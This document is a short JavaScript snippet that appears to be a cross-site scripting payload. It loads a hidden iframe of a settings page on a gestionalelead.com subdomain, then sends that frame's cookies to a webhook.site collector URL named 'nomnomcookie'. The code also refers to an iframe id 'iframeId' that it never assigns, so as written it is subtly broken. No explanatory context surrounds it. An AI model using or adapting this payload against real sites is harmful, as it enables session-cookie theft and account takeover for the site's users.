var iframe = document.createElement('iframe');
iframe.style.display = "none";
iframe.src = 'https://bishopfox.gestionalelead.com/settings/third-parts';
document.body.appendChild(iframe);

let xhr = new XMLHttpRequest();
xhr.open('GET', 'http://webhook.site/nomnomcookie?cookie=' + document.getElementById("iframeId").contentDocument.cookie);
xhr.responseType = 'json';
xhr.send();
